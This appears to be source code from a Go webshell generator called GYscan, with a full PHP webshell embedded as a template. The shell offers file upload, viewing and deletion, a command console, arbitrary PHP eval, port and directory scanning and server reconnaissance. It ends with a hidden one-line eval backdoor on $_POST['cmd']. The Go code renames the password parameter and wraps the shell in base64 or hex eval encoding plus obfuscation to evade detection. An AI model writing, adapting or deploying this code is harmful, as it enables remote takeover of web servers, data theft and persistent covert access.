                    if(@chmod($cwd, 0777)) {
                        echo "<div style='color:#ffff00'>目录权限已修复为0777</div>";
                    }
                }
                
                $targetPath = $cwd . DIRECTORY_SEPARATOR . $uploadFile['name'];
                
                // 检查目标文件是否已存在
                if(file_exists($targetPath)) {
                    // 尝试删除已存在的文件
                    if(@unlink($targetPath)) {
                        echo "<div style='color:#ffff00'>已删除同名文件: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    } else {
                        echo "<div style='color:#ff0000'>无法删除同名文件</div>";
                    }
                }
                
                // 尝试多种上传方法
                $uploadSuccess = false;
                
                // 方法1: 标准move_uploaded_file
                if(@move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
                    echo "<div style='color:#00ff00'>文件上传成功（标准方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    @chmod($targetPath, 0644);
                    $uploadSuccess = true;
                } 
                // 方法2: 复制方法
                elseif(@copy($uploadFile['tmp_name'], $targetPath)) {
                    echo "<div style='color:#00ff00'>文件上传成功（复制方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    @chmod($targetPath, 0644);
                    $uploadSuccess = true;
                }
                // 方法3: 文件内容写入
                else {
                    $content = @file_get_contents($uploadFile['tmp_name']);
                    if($content !== false && @file_put_contents($targetPath, $content) !== false) {
                        echo "<div style='color:#00ff00'>文件上传成功（内容写入方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                        @chmod($targetPath, 0644);
                        $uploadSuccess = true;
                    }
                }
                
                if(!$uploadSuccess) {
                    // 输出详细的错误信息
                    $errorMsg = "文件上传失败 - ";
                    if(!is_writable($cwd)) {
                        $errorMsg .= "目录不可写 (权限: " . substr(sprintf('%o', fileperms($cwd)), -4) . ")";
                    } elseif(!is_uploaded_file($uploadFile['tmp_name'])) {
                        $errorMsg .= "文件上传验证失败";
                    } else {
                        $errorMsg .= "所有上传方法都失败";
                    }
                    echo "<div style='color:#ff0000'>" . $errorMsg . "</div>";
                    
                    // 显示详细的系统信息
                    echo "<div style='color:#ffff00'>当前目录: " . htmlspecialchars($cwd) . "</div>";
                    echo "<div style='color:#ffff00'>目录权限: " . substr(sprintf('%o', fileperms($cwd)), -4) . "</div>";
                    echo "<div style='color:#ffff00'>Web服务器用户: " . @get_current_user() . "</div>";
                    echo "<div style='color:#ffff00'>PHP进程用户: " . (function_exists('posix_getuid') ? posix_getuid() : '未知') . "</div>";
                    
                    // 尝试创建测试文件
                    $testFile = $cwd . DIRECTORY_SEPARATOR . 'test_write.txt';
                    if(@file_put_contents($testFile, 'test') !== false) {
                        echo "<div style='color:#00ff00'>测试文件创建成功，目录可写</div>";
                        @unlink($testFile);
                    } else {
                        echo "<div style='color:#ff0000'>测试文件创建失败，目录确实不可写</div>";
                        
                        // 提供解决方案
                        echo "<div style='color:#ffff00;margin:10px 0;padding:10px;border:1px solid #ffff00;background:#222;'>";
                        echo "<h3>💡 解决方案：</h3>";
                        echo "<p>由于PHP进程用户没有写入权限，请尝试以下方法：</p>";
                        echo "<ol>";
                        echo "<li><strong>方法1：更改目录权限</strong><br>";
                        echo "在服务器上执行命令：<code>sudo chmod 777 /var/www/html/</code></li>";
                        echo "<li><strong>方法2：更改目录所有者</strong><br>";
                        echo "在服务器上执行命令：<code>sudo chown www-data:www-data /var/www/html/</code></li>";
                        echo "<li><strong>方法3：使用可写子目录</strong><br>";
                        echo "尝试上传到可写的子目录，如：<code>/var/www/html/uploads/</code></li>";
                        echo "<li><strong>方法4：使用临时目录</strong><br>";
                        echo "尝试上传到临时目录：<code>/tmp/</code></li>";
                        echo "</ol>";
                        echo "</div>";
                        
                        // 尝试自动寻找可写目录
                        echo "<div style='color:#ffff00;margin:10px 0;'>正在扫描可写目录...</div>";
                        $writableDirs = array();
                        $potentialDirs = array(
                            '/tmp/',
                            '/var/tmp/',
                            '/home/yiqiu/',
                            '/var/www/html/uploads/',
                            '/var/www/html/tmp/',
                            '/var/www/tmp/',
                            @$_SERVER['DOCUMENT_ROOT'] . '/uploads/',
                            dirname(@$_SERVER['SCRIPT_FILENAME']) . '/uploads/'
                        );
                        
                        foreach($potentialDirs as $dir) {
                            if(@is_dir($dir) && @is_writable($dir)) {
                                $writableDirs[] = $dir;
                                echo "<div style='color:#00ff00'>发现可写目录: " . htmlspecialchars($dir) . "</div>";
                            }
                        }
                        
                        if(!empty($writableDirs)) {
                            echo "<div style='color:#00ff00;margin:10px 0;padding:10px;border:1px solid #00ff00;background:#222;'>";
                            echo "<h3>✅ 发现可写目录！</h3>";
                            echo "<p>您可以将文件上传到以下可写目录：</p>";
                            echo "<ul>";
                            foreach($writableDirs as $dir) {
                                echo "<li><code>" . htmlspecialchars($dir) . "</code></li>";
                            }
                            echo "</ul>";
                            echo "</div>";
                        }
                    }
                }
            }
        } else {
            // 输出上传错误代码
            $uploadErrors = array(
                1 => "文件大小超过服务器限制",
                2 => "文件大小超过表单限制", 
                3 => "文件只有部分被上传",
                4 => "没有文件被上传",
                6 => "找不到临时文件夹",
                7 => "文件写入失败",
                8 => "PHP扩展程序停止文件上传"
            );
            $errorCode = $uploadFile['error'];
            $errorMsg = isset($uploadErrors[$errorCode]) ? $uploadErrors[$errorCode] : "未知错误 (代码: $errorCode)";
            echo "<div style='color:#ff0000'>文件上传失败: " . $errorMsg . "</div>";
        }
    }
    
    // 文件操作处理
    if(isset($_POST['p1'])) {
        switch($_POST['p1']) {
            case 'view':
                $file = $_POST['p2'];
                if(@is_readable($file)) {
                    echo "<h3>查看文件: " . htmlspecialchars($file) . "</h3>";
                    echo "<pre class='ml1'>" . htmlspecialchars(@file_get_contents($file)) . "</pre>";
                }
                break;
            case 'delete':
                $file = $_POST['p2'];
                if(@unlink($file)) {
                    echo "<div style='color:#00ff00'>文件删除成功</div>";
                } else {
                    echo "<div style='color:#ff0000'>文件删除失败, 请检查文件权限!</div>";
                }
                break;
            case 'create_file':
                $filename = $_POST['p2'];
                $content = $_POST['p3'];
                $fullPath = $cwd . $filename;
                if(@file_put_contents($fullPath, $content) !== false) {
                    echo "<div style='color:#00ff00'>文件创建成功: " . htmlspecialchars($filename) . "</div>";
                    @chmod($fullPath, 0644);
                } else {
                    echo "<div style='color:#ff0000'>文件创建失败: " . htmlspecialchars($filename) . "</div>";
                }
                break;
            case 'create_folder':
                $foldername = $_POST['p2'];
                $fullPath = $cwd . $foldername;
                if(@mkdir($fullPath, 0755, true)) {
                    echo "<div style='color:#00ff00'>文件夹创建成功: " . htmlspecialchars($foldername) . "</div>";
                } else {
                    echo "<div style='color:#ff0000'>文件夹创建失败: " . htmlspecialchars($foldername) . "</div>";
                }
                break;
            case 'delete_folder':
                $folder = $_POST['p2'];
                if(@is_dir($folder)) {
                    // 递归删除文件夹
                    if(gyscanDeleteFolder($folder)) {
                        echo "<div style='color:#00ff00'>文件夹删除成功</div>";
                    } else {
                        echo "<div style='color:#ff0000'>文件夹删除失败, 请检查文件夹权限!</div>";
                    }
                } else {
                    echo "<div style='color:#ff0000'>目标不是文件夹或不存在</div>";
                }
                break;
        }
    }
    
    // 目录导航表单
    echo "<form method='post' style='margin:10px 0;padding:10px;border:1px solid #444;background:#222;'>
        <input type='hidden' name='a' value='FilesMan'>
        <span style='font-weight:bold;color:#ffff00;'>📁 目录导航:</span><br>
        <input type='text' name='c' value='" . htmlspecialchars($cwd) . "' style='width:70%;margin:5px 0;padding:5px;background:#333;color:#fff;border:1px solid #555;' placeholder='输入完整目录路径'>
        <input type='submit' value='进入目录' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'>
    </form>";
    
    // 创建文件和文件夹表单（水平布局）
    echo "<div style='margin:10px 0;padding:10px;border:1px solid #444;background:#222;'>
        <span style='font-weight:bold;color:#ffff00;'>📄 创建文件/文件夹:</span><br>
        
        <div style='display:flex;gap:20px;margin-top:10px;'>
            <!-- 创建文件表单 -->
            <div style='flex:1;'>
                <form method='post'>
                    <input type='hidden' name='a' value='FilesMan'>
                    <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                    <input type='hidden' name='p1' value='create_file'>
                    <table style='width:100%;'>
                        <tr>
                            <td style='width:80px;'>文件名:</td>
                            <td><input type='text' name='p2' placeholder='例如: test.txt' style='width:100%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                        </tr>
                        <tr>
                            <td>内容:</td>
                            <td><textarea name='p3' placeholder='文件内容（可选）' style='width:100%;height:40px;padding:5px;background:#333;color:#fff;border:1px solid #555;'></textarea></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td><input type='submit' value='创建文件' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'></td>
                        </tr>
                    </table>
                </form>
            </div>
            
            <!-- 创建文件夹表单 -->
            <div style='flex:1;'>
                <form method='post'>
                    <input type='hidden' name='a' value='FilesMan'>
                    <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                    <input type='hidden' name='p1' value='create_folder'>
                    <table style='width:100%;'>
                        <tr>
                            <td style='width:80px;'>文件夹名:</td>
                            <td><input type='text' name='p2' placeholder='例如: new_folder' style='width:100%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td><input type='submit' value='创建文件夹' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'></td>
                        </tr>
                    </table>
                </form>
            </div>
        </div>
    </div>";
    
    // 文件上传表单
    echo "<form method='post' enctype='multipart/form-data' style='margin:10px 0;' id='uploadForm'>
        <input type='hidden' name='a' value='FilesMan'>
        <span>上传文件:</span><br>
        <input type='file' name='f'>
        <div style='margin:10px 0;'>
            <label><input type='radio' name='uploadPath' value='current' checked> 当前目录 (" . htmlspecialchars($cwd) . ")</label><br>";
    
    // 扫描可写目录选项
    $writableDirs = array();
    $potentialDirs = array(
        '/tmp/' => '系统临时目录',
        '/var/tmp/' => '系统临时目录',
        '/home/yiqiu/' => '用户主目录',
        '/var/www/html/uploads/' => '网站上传目录',
        '/var/www/html/tmp/' => '网站临时目录',
        '/var/www/tmp/' => '网站临时目录',
        @$_SERVER['DOCUMENT_ROOT'] . '/uploads/' => '文档根目录上传',
        dirname(@$_SERVER['SCRIPT_FILENAME']) . '/uploads/' => '脚本目录上传'
    );
    
    foreach($potentialDirs as $dir => $desc) {
        if(@is_dir($dir) && @is_writable($dir)) {
            $writableDirs[$dir] = $desc;
            echo "<label><input type='radio' name='uploadPath' value='" . htmlspecialchars($dir) . "'> " . htmlspecialchars($desc) . " (" . htmlspecialchars($dir) . ")</label><br>";
        }
    }
    
    echo "</div>
        <input type='submit' value='上传'>
    </form>
    
    <script>
    document.getElementById('uploadForm').addEventListener('submit', function(e) {
        var selectedPath = document.querySelector('input[name=\"uploadPath\"]:checked').value;
        if(selectedPath !== 'current') {
            // 更新隐藏的目录字段
            var cInput = document.createElement('input');
            cInput.type = 'hidden';
            cInput.name = 'c';
            cInput.value = selectedPath;
            this.appendChild(cInput);
        }
    });
    </script>";
    
    // 文件列表
    $files = @scandir($cwd);
    if($files) {
        echo "<table class='main' width='100%' cellpadding='5' cellspacing='0'>
            <tr><th>名称</th><th>大小</th><th>修改时间</th><th>权限</th><th>操作</th></tr>";
        
        $i = 0;
        foreach($files as $file) {
            if($file == "." || $file == "..") continue;
            
            $fullPath = $cwd . $file;
            $isDir = @is_dir($fullPath);
            $size = $isDir ? "DIR" : gyscanViewSize(@filesize($fullPath));
            $modTime = @date("Y-m-d H:i:s", @filemtime($fullPath));
            $perms = @fileperms($fullPath);
            
            echo "<tr class='l" . ($i++ % 2 + 1) . "'>
                <td>" . ($isDir ? "📁" : "📄") . " " . htmlspecialchars($file) . "</td>
                <td>" . $size . "</td>
                <td>" . $modTime . "</td>
                <td>" . substr(sprintf('%o', $perms), -4) . "</td>
                <td>";
            
            if(!$isDir) {
                echo "<a href='#' onclick=\"g('FilesMan','" . $cwd . "','view','" . $file . "')\">查看</a> ";
                echo "<a href='#' onclick=\"g('FilesMan','" . $cwd . "','delete','" . $file . "')\">删除</a>";
            } else {
                echo "<a href='#' onclick=\"g('FilesMan','" . $fullPath . "/')\">进入</a> ";
                echo "<a href='#' onclick=\"if(confirm('确定要删除文件夹 \\\"" . htmlspecialchars($file) . "\\\" 吗？此操作不可恢复！')) g('FilesMan','" . $cwd . "','delete_folder','" . $file . "')\" style='color:#ff4444;'>删除</a>";
            }
            
            echo "</td></tr>";
        }
        echo "</table>";
    } else {
        echo "无法读取目录";
    }
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 命令执行器 - GYscan版本
 */
function actionConsole() {
    global $GYSCAN_ALIASES;
    
    // 检查是否是AJAX请求（通过executeGYscan函数调用）
    $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
    
    if(!$isAjax) {
        // 正常页面请求，显示完整界面
        gyscanHeader();
        echo "<div class=content>";
        
        // 命令输入表单
        echo "<form onsubmit='executeGYscan(this.c.value);return false;' style='margin:10px 0;'>
            <span>输入命令:</span><br>
            <input type='text' name='c' class='toolsInp' placeholder='输入要执行的命令'>
            <input type='submit' value='执行'>
        </form>";
        
        // 命令别名
        echo "<h3>常用命令:</h3><div style='margin:10px 0;'>";
        foreach($GYSCAN_ALIASES as $name => $cmd) {
            echo "<a href='javascript:void(0)' onclick=\"executeGYscan('" . addslashes($cmd) . "')\" style='display:inline-block;margin:2px;padding:5px;border:1px solid #444;'>" . $name . "</a> ";
        }
        echo "</div>";
        
        echo "<div id='output'></div>";
        echo "</div>";
        gyscanFooter();
    } else {
        // AJAX请求，只返回命令执行结果
        if(isset($_POST['p1'])) {
            $cmd = $_POST['p1'];
            echo "<h3>执行命令: " . htmlspecialchars($cmd) . "</h3>";
            echo "<pre class='ml1' style='color:#00ff00'>" . htmlspecialchars(gyscanEx($cmd)) . "</pre>";
        }
    }
}

/**
 * 数据库管理 - GYscan版本
 */
function actionSql() {
    gyscanHeader();
    echo "<h1>🗄️ 数据库管理</h1><div class=content>";
    
    // 数据库连接测试
    if(isset($_POST['p1'])) {
        $dbType = $_POST['p1'];
        $host = $_POST['p2'];
        $user = $_POST['p3'];
        $pass = $_POST['p4'];
        $db = $_POST['p5'];
        
        echo "<h3>数据库连接测试:</h3>";
        
        if($dbType == 'mysql') {
            if(function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($host, $user, $pass, $db);
                if($conn) {
                    echo "<div style='color:#00ff00'>MySQL连接成功!</div>";
                    @mysqli_close($conn);
                } else {
                    echo "<div style='color:#ff0000'>MySQL连接失败: " . @mysqli_connect_error() . "</div>";
                }
            } else {
                echo "<div style='color:#ff0000'>MySQL扩展未安装</div>";
            }
        } elseif($dbType == 'postgresql') {
            if(function_exists('pg_connect')) {
                $connStr = "host=$host user=$user password=$pass dbname=$db";
                $conn = @pg_connect($connStr);
                if($conn) {
                    echo "<div style='color:#00ff00'>PostgreSQL连接成功!</div>";
                    if(function_exists('pg_close')) @pg_close($conn);
                } else {
                    echo "<div style='color:#ff0000'>PostgreSQL连接失败</div>";
                }
            } else {
                echo "<div style='color:#ff0000'>PostgreSQL扩展未安装</div>";
            }
        }
    }
    
    echo "<h3>数据库连接测试:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='Sql'>
        <table>
            <tr><td>数据库类型:</td><td>
                <select name='p1'>
                    <option value='mysql'>MySQL</option>
                    <option value='postgresql'>PostgreSQL</option>
                </select>
            </td></tr>
            <tr><td>主机:</td><td><input type='text' name='p2' value='localhost'></td></tr>
            <tr><td>用户名:</td><td><input type='text' name='p3' value='root'></td></tr>
            <tr><td>密码:</td><td><input type='password' name='p4'></td></tr>
            <tr><td>数据库名:</td><td><input type='text' name='p5'></td></tr>
            <tr><td colspan='2'><input type='submit' value='测试连接'></td></tr>
        </table>
    </form>";
    
    echo "<h3>数据库信息:</h3>";
    echo "<pre class='ml1'>";
    if(function_exists('mysqli_connect')) {
        echo "MySQL扩展: 已安装\n";
    } else {
        echo "MySQL扩展: 未安装\n";
    }
    if(function_exists('pg_connect')) {
        echo "PostgreSQL扩展: 已安装\n";
    } else {
        echo "PostgreSQL扩展: 未安装\n";
    }
    echo "</pre>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * PHP工具 - GYscan版本
 */
function actionPhptools() {
    gyscanHeader();
    echo "<h1>🔧 PHP工具</h1><div class=content>";
    
    // PHP代码执行
    if(isset($_POST['p1'])) {
        $phpCode = $_POST['p1'];
        echo "<h3>PHP代码执行结果:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
        ob_start();
        eval($phpCode);
        $output = ob_get_clean();
        echo htmlspecialchars($output);
        echo "</pre>";
    }
    
    echo "<h3>PHP代码执行:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='phptools'>
        <textarea name='p1' rows='10' cols='80' placeholder='输入PHP代码，例如: echo \"Hello World\";'>" . htmlspecialchars(@$_POST['p1']) . "</textarea><br>
        <input type='submit' value='执行PHP代码'>
    </form>";
    
    echo "<h3>PHP信息:</h3>";
    echo "<pre class='ml1'>";
    echo "PHP版本: " . phpversion() . "\n";
    echo "Zend引擎: " . zend_version() . "\n";
    echo "已加载扩展: " . implode(", ", get_loaded_extensions()) . "\n";
    echo "</pre>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 网络扫描 - GYscan版本
 */
function actionNetwork() {
    gyscanHeader();
    echo "<h1>🌐 网络扫描</h1><div class=content>";
    
    if(isset($_POST['p1'])) {
        $target = $_POST['p1'];
        echo "<h3>网络扫描结果 - $target:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
        
        // 简单的网络扫描
        if(filter_var($target, FILTER_VALIDATE_IP)) {
            echo "IP地址: $target\n";
            echo "主机名: " . @gethostbyaddr($target) . "\n";
            
            // 端口扫描
            $ports = array(21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432);
            foreach($ports as $port) {
                $fp = @fsockopen($target, $port, $errno, $errstr, 1);
                if($fp) {
                    echo "端口 $port: 开放\n";
                    fclose($fp);
                } else {
                    echo "端口 $port: 关闭\n";
                }
            }
        } else {
            echo "域名: $target\n";
            $ip = @gethostbyname($target);
            echo "IP地址: $ip\n";
        }
        
        echo "</pre>";
    }
    
    echo "<h3>网络扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='Network'>
        <input type='text' name='p1' placeholder='输入IP地址或域名' value='" . htmlspecialchars(@$_POST['p1']) . "'>
        <input type='submit' value='开始扫描'>
    </form>";
    
    echo "<h3>本地网络信息:</h3>";
    echo "<pre class='ml1'>";
    echo "服务器IP: " . (@$_SERVER['SERVER_ADDR'] ?: '未知') . "\n";
    echo "客户端IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    echo "服务器端口: " . $_SERVER['SERVER_PORT'] . "\n";
    echo "</pre>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 端口扫描 - GYscan版本
 */
function actionPortScan() {
    gyscanHeader();
    echo "<h1>🔍 端口扫描</h1><div class=content>";
    
    if(isset($_POST['p1'])) {
        $target = $_POST['p1'];
        $startPort = intval($_POST['p2']);
        $endPort = intval($_POST['p3']);
        
        echo "<h3>端口扫描结果 - $target:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
        
        for($port = $startPort; $port <= $endPort; $port++) {
            $fp = @fsockopen($target, $port, $errno, $errstr, 1);
            if($fp) {
                echo "端口 $port: 开放\n";
                fclose($fp);
            }
        }
        
        echo "</pre>";
    }
    
    echo "<h3>端口扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='PortScan'>
        <table>
            <tr><td>目标:</td><td><input type='text' name='p1' value='localhost'></td></tr>
            <tr><td>起始端口:</td><td><input type='number' name='p2' value='1'></td></tr>
            <tr><td>结束端口:</td><td><input type='number' name='p3' value='1000'></td></tr>
            <tr><td colspan='2'><input type='submit' value='开始扫描'></td></tr>
        </table>
    </form>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 目录扫描 - GYscan版本
 */
function actionDirScan() {
    gyscanHeader();
    echo "<h1>📂 目录扫描</h1><div class=content>";
    
    if(isset($_POST['p1'])) {
        $baseDir = $_POST['p1'];
        $pattern = $_POST['p2'];
        
        echo "<h3>目录扫描结果 - $baseDir:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
        
        function scanDirectory($dir, $pattern) {
            $results = array();
            if($handle = @opendir($dir)) {
                while(false !== ($entry = readdir($handle))) {
                    if($entry != "." && $entry != "..") {
                        $fullPath = $dir . "/" . $entry;
                        if(@is_dir($fullPath)) {
                            $results = array_merge($results, scanDirectory($fullPath, $pattern));
                        } else {
                            if(empty($pattern) || preg_match("/$pattern/i", $entry)) {
                                $results[] = $fullPath;
                            }
                        }
                    }
                }
                closedir($handle);
            }
            return $results;
        }
        
        $files = scanDirectory($baseDir, $pattern);
        foreach($files as $file) {
            echo $file . "\n";
        }
        
        echo "</pre>";
    }
    
    echo "<h3>目录扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='DirScan'>
        <table>
            <tr><td>目录路径:</td><td><input type='text' name='p1' value='/var/www'></td></tr>
            <tr><td>文件模式:</td><td><input type='text' name='p2' placeholder='例如: .php$'></td></tr>
            <tr><td colspan='2'><input type='submit' value='开始扫描'></td></tr>
        </table>
    </form>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 信息收集 - GYscan版本
 */
function actionInfoGather() {
    gyscanHeader();
    echo "<h1>📊 信息收集</h1><div class=content>";
    
    echo "<h3>系统信息:</h3>";
    echo "<pre class='ml1'>";
    echo "操作系统: " . php_uname() . "\n";
    echo "PHP版本: " . phpversion() . "\n";
    echo "服务器软件: " . @$_SERVER['SERVER_SOFTWARE'] . "\n";
    echo "文档根目录: " . @$_SERVER['DOCUMENT_ROOT'] . "\n";
    echo "当前用户: " . @get_current_user() . "\n";
    echo "</pre>";
    
    echo "<h3>PHP配置:</h3>";
    echo "<pre class='ml1'>";
    echo "安全模式: " . (@ini_get('safe_mode') ? "开启" : "关闭") . "\n";
    echo "禁用函数: " . (@ini_get('disable_functions') ?: "无") . "\n";
    echo "Open BaseDir: " . (@ini_get('open_basedir') ?: "无限制") . "\n";
    echo "内存限制: " . @ini_get('memory_limit') . "\n";
    echo "上传限制: " . @ini_get('upload_max_filesize') . "\n";
    echo "执行时间: " . @ini_get('max_execution_time') . "秒\n";
    echo "</pre>";
    
    echo "<h3>环境变量:</h3>";
    echo "<pre class='ml1'>";
    foreach($_SERVER as $key => $value) {
        if(strpos($key, 'HTTP_') === 0 || in_array($key, array('PATH', 'PWD', 'HOME'))) {
            echo "$key: $value\n";
        }
    }
    echo "</pre>";
    
    echo "</div>";
    gyscanFooter();
}

/**
 * 安全信息 - GYscan版本
 */
function actionSecInfo() {
    gyscanHeader();
    echo "<h1>🔒 安全信息</h1><div class=content>";
    
    echo "<h3>PHP配置信息:</h3>";
    echo "<pre class='ml1'>";
    echo "安全模式: " . (@ini_get('safe_mode') ? "开启" : "关闭") . "\n";
    echo "禁用函数: " . (@ini_get('disable_functions') ?: "无") . "\n";
    echo "Open BaseDir: " . (@ini_get('open_basedir') ?: "无限制") . "\n";
    echo "内存限制: " . @ini_get('memory_limit') . "\n";
    echo "上传限制: " . @ini_get('upload_max_filesize') . "\n";
    echo "执行时间: " . @ini_get('max_execution_time') . "秒\n";
    echo "</pre>";
    
    echo "<h3>系统信息:</h3>";
    echo "<pre class='ml1'>";
    echo php_uname() . "\n";
    echo "服务器IP: " . (@$_SERVER['SERVER_ADDR'] ?: '未知') . "\n";
    echo "文档根目录: " . (@$_SERVER['DOCUMENT_ROOT'] ?: '未知') . "\n";
    echo "</pre>";
    
    echo "</div>";
    gyscanFooter();
}

// 主处理逻辑
 if(isset($_POST['a'])) {
    $action = $_POST['a'];
    switch($action) {
        case 'FilesMan':
            actionFilesMan();
            break;
        case 'Console':
            actionConsole();
            break;
        case 'Sql':
            actionSql();
            break;
        case 'phptools':
            actionPhptools();
            break;
        case 'Network':
            actionNetwork();
            break;
        case 'PortScan':
            actionPortScan();
            break;
        case 'DirScan':
            actionDirScan();
            break;
        case 'InfoGather':
            actionInfoGather();
            break;
        case 'SecInfo':
            actionSecInfo();
            break;
        default:
            // 默认显示文件管理器
            actionFilesMan();
            break;
    }
} else {
    // 默认显示文件管理器
    actionFilesMan();
}

// 隐藏的一句话木马 - 用于远程代码执行
// 如果用户设置了自定义连接密码，则使用该密码，否则使用默认的attack
if(isset($_POST['cmd'])) {
    @eval($_POST['cmd']);
}

?>`

	// 如果用户提供了密码，则替换默认的cmd参数
	if options.Password != "" {
		// 替换默认的cmd参数为用户设置的密码
		noPasswordShell = strings.Replace(noPasswordShell, "cmd", options.Password, -1)
	}

	// 对于大马，如果用户选择不编码，则直接返回原始代码
	if strings.ToLower(options.EncodeType) == "none" {
		// 大马不需要编码，直接返回完整代码
		return noPasswordShell
	}

	// 应用编码（仅当用户选择编码时）
	if strings.ToLower(options.EncodeType) != "none" {
		switch strings.ToLower(options.EncodeType) {
		case "base64":
			noPasswordShell = base64.StdEncoding.EncodeToString([]byte(noPasswordShell))
			noPasswordShell = fmt.Sprintf(`<?php
@error_reporting(0);
eval(base64_decode('%s'));
?>`, noPasswordShell)
		case "hex":
			noPasswordShell = encodeToHex(noPasswordShell)
			noPasswordShell = fmt.Sprintf(`<?php
@error_reporting(0);
eval(pack('H*','%s'));
?>`, noPasswordShell)
		}
	}

	// 应用混淆
	safeLevel := options.ObfuscateLevel
	if safeLevel > 1 {
		safeLevel = 1 // 最高使用级别1的混淆，避免过于复杂导致问题
	}

	return obfuscatePHP(noPasswordShell, safeLevel)
}

// generateRandomString 生成指定长度的随机字符串
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	_, err := rand.Read(result)
	if err != nil {
		// 如果随机数生成失败，使用伪随机替代
		for i := range result {
			result[i] = charset[int(result[i])%len(charset)]
		}
		return string(result)
	}

	for i := range result {
		result[i] = charset[int(result[i])%len(charset)]
	}
	return string(result)
}
